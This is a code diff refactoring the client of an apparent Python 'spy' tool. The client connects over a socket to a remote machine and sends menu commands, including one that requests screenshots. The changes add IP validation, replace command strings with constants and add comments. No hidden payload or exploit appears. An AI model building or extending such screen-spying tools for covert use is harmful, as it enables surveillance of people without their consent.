@@ -2,10 +2,8 @@ from spy_support import interaction, menu
 from PIL import Image
 import socket
 import sys
-import os
 import io
 
-IP = "192.168.254.196"
 HEADER_LENGTH = 10
 
 
@@ -46,12 +44,12 @@ def spy_server(client_socket):
                     print("[!] Command not recognized")
                     continue
                 valid = True
-            if message.lower() == "!r":
+            if message.lower() == interaction.CMD_REQUESTSCREENSHOTS:
                 break
-            elif message.lower() == "!b":
+            elif message.lower() == interaction.CMD_BACKTOMAIN:
                 spying = False
                 break
-            elif message.lower() == "!d":
+            elif message.lower() == interaction.CMD_DISCONNECT:
                 interaction.disconnect_client(client_socket)
                 sys.exit()
             else:
@@ -74,6 +72,26 @@ def spy_server(client_socket):
             break
 
 def start_client():
+    # Request server IP
+    valid = False
+    while not valid:
+        ip_temp = input("Enter server IP address: ")
+        nums = ip_temp.split(".")
+        if len(nums) != 4:
+            print("[!] Invalid input")
+            continue
+        for num in nums:
+            if not num.isnumeric():
+                print("[!] Invalid input")
+                break
+            if int(num) not in range(256):
+                print("[!] Invalid input")
+                break
+        else:
+            ip = ip_temp
+            valid = True
+
+    # Request server socket port
     valid = False
     while not valid:
         port_temp = input("Enter server port number: ")
@@ -83,19 +101,20 @@ def start_client():
         else:
             print("[!] Invalid input")
 
+    # Setting client socket and server connection
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    client_socket.connect((IP, port))
-
+    client_socket.connect((ip, port))
     interaction.send_message(client_socket, socket.gethostname())
-    # welcome_message = receive_message(client_socket)
     welcome_message = interaction.receive_message(client_socket, role="client")
     print(f"\n{welcome_message}\n")
 
+    # Main program
     while True:
         print("\n[MAIN MENU]")
         print("Please select a command of your choice from the menu below")
         menu.print_menu("main")
 
+        # Asking for menu option
         valid = False
         while not valid:
             command = input("Your command: ")
@@ -105,6 +124,7 @@ def start_client():
             else:
                 print("[!] Command not recognized.")
 
+        # Redirect to menu-specialized functions
         if command == "s":
             spy_server(client_socket)
         elif command == "m":
